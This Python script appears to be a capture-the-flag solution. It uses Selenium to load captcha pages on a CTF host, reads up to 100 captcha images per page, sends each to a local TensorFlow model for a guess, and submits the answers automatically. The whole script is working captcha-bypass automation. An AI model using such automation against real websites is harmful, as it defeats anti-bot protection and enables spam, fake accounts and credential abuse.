import base64
from selenium import webdriver
import requests
import os
import json
import time


driver = webdriver.Chrome()

headers = {
    'cache-control': 'no-cache',
    'content-type': 'application/json',
}

def solve_captcha(img_data):    
    data = '{\n  "signature_name": "serving_default",\n  "inputs": {\n     \t"input": { "b64": "' + img_data.decode("utf-8")  + '" }\n  }\n}'

    response = requests.post('http://localhost:8501/v1/models/captcha:predict', headers=headers, data=data).text

    y = json.loads(response)
    out = y["outputs"]
    print("Prob: " + str(out["probability"]) + " Guess: " + str(out["output"]))

    return out["output"]

def solve_0():
    time.sleep(0.5)
    img = driver.find_element_by_tag_name('img')
    img_data = img.get_attribute("src")[22:].encode()
    
    inp = driver.find_element_by_tag_name('input')
    inp.send_keys(solve_captcha(img_data))

    buttons = driver.find_elements_by_tag_name('button')
    
    for btn in buttons:
        if btn.get_attribute("type") == "submit" and btn.text=="Next":
            btn.click()

            break
    
def solve_1():
    time.sleep(0.5)
    imgs = driver.find_elements_by_tag_name('img')
    inps = driver.find_elements_by_tag_name('input')

    for i in range(0,3):
        img_data = imgs[i].get_attribute("src")[22:].encode()
        inps[i].send_keys(solve_captcha(img_data))

    buttons = driver.find_elements_by_tag_name('button')
    
    for btn in buttons:
        if btn.get_attribute("type") == "submit" and btn.text=="Next":
            btn.click()

            break

def solve_2():
    time.sleep(0.5)
    imgs = driver.find_elements_by_tag_name('img')
    inps = driver.find_elements_by_tag_name('input')


    for i in range(0,10):
        img_data = imgs[i].get_attribute("src")[22:].encode()
    
        inps[i].send_keys(solve_captcha(img_data))

    buttons = driver.find_elements_by_tag_name('button')
    
    for btn in buttons:
        if btn.get_attribute("type") == "submit" and btn.text=="Next":
            btn.click()

            break

def solve_3():
    time.sleep(0.2)
    imgs = driver.find_elements_by_tag_name('img')
    inps = driver.find_elements_by_tag_name('input')


    for i in range(0,100):
        img_data = imgs[i].get_attribute("src")[22:].encode()
    
        inps[i].send_keys(solve_captcha(img_data))

    buttons = driver.find_elements_by_tag_name('button')
    
    for btn in buttons:
        if btn.get_attribute("type") == "submit" and btn.text=="Next":
            btn.click()

            break
    

if __name__ == '__main__':
    driver.get('http://hax1.allesctf.net:9200/captcha/0')

    solve_0()
    solve_1()
    solve_2()
    solve_3()

    #driver.close()